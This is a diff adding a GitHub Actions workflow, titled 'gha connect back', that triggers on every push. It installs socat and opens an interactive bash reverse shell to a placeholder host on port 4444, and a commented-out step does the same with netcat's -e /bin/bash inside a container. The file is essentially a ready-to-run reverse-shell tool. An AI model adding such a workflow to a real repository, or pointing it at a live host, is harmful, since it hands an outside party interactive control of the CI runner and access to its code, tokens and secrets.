@@ -1,0 +1,23 @@
+name: gha connect back
+# This workflow is triggered on pushes to the repository.
+on: [push]
+
+jobs:
+  build:
+    name: connect_back
+    # This job runs on Linux
+    runs-on: ubuntu-latest
+    steps:
+    # connect back in container:
+    #  - name: init
+    #    uses: docker://uchimata/system-analysis
+    #    with:
+    #        entrypoint: /bin/nc
+    #        args: "your.host.invalid 4444 -e /bin/bash"
+    # for connect back on vm level:
+      - name: apt-get update 
+        run: sudo apt-get update
+      - name: install socat
+        run: sudo apt-get -y install socat
+      - name: connect back
+        run: /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:your.host.invalid:4444
